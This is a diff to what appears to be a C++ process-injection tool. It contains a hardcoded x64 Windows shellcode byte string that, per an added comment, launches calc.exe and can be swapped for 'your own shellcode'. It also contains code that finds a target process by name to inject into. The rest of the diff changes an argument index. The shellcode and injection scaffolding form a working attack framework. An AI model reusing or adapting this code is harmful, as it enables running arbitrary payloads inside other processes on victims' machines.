@@ -44,6 +44,7 @@ extern "C" {
             return;
         }
 
+        // this shellcode is running calc.exe, you can provide with your own shellcode.
         const char* shellcode = 
         "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
         "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
@@ -54,7 +55,7 @@ extern "C" {
         "\x48\x83\xec\x20\x41\xff\xd6";
         HANDLE pHandle;
 
-        std::wstring wProcessName = ConvertToWideString(static_cast<const char*>(args[1]));
+        std::wstring wProcessName = ConvertToWideString(static_cast<const char*>(args[0]));
         const wchar_t* processName = wProcessName.c_str();
 
         if(GetProcessIdByName(processName) != -69){
